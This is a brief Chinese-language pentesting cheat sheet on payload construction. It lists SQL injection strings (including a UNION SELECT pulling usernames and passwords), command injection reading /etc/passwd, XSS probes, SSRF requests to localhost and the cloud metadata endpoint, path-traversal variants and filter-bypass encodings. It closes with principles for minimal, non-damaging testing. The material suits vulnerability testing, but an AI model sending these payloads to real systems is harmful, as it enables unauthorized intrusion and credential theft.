# Payload 构造技术

## 概述

Payload 是渗透测试中用于验证漏洞利用可能性的代码或数据。正确构造 payload 是漏洞验证的关键步骤。

## Payload 类型

### 1. 注入类 Payload

**SQL 注入**
```
' OR 1=1 --
' UNION SELECT null,username,password FROM users --
' AND SLEEP(5) --
```

**命令注入**
```
; ls -la
| cat /etc/passwd
$(whoami)
`id`
```

**XSS**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
```

### 2. 探测类 Payload

**SSRF**
```
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
dict://127.0.0.1:6379/INFO
```

**路径穿越**
```
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### 3. 编码绕过

**URL 编码**: 将特殊字符转换为 %XX 格式
**Base64 编码**: 用于绕过简单过滤
**十六进制编码**: SQL 注入常用
**HTML 实体**: XSS 绕过

## 构造原则

1. **最小化**: 使用最简单的 payload 验证漏洞
2. **安全性**: 仅验证利用可能性，不造成实际损害
3. **可复现**: payload 应能在相同条件下稳定复现
4. **记录**: 记录每个 payload 的目的和结果
